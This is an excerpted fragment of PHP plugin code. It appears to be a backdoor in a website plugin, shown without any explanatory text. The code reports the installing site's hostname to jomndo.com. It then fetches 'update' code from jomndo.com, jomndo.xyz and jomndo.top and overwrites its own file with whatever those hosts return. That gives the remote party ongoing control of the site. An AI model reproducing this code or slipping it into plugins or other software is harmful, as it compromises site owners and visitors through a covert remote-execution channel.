...
{
    if(!$log_installed = @file_get_contents("http://www.jomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
{
    $log_installed = @file_get_contents_mplugin("http://www.jomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
}
}
/*************************set default options***************************/
...
if( ini_get('allow_url_fopen') ) {
        ...
        if (($new_version = @file_get_contents("http://www.jomndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.jomndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents("http://www.jomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents("http://www.jomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
...
else
{
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents_mplugin("http://www.jomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents_mplugin("http://www.jomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
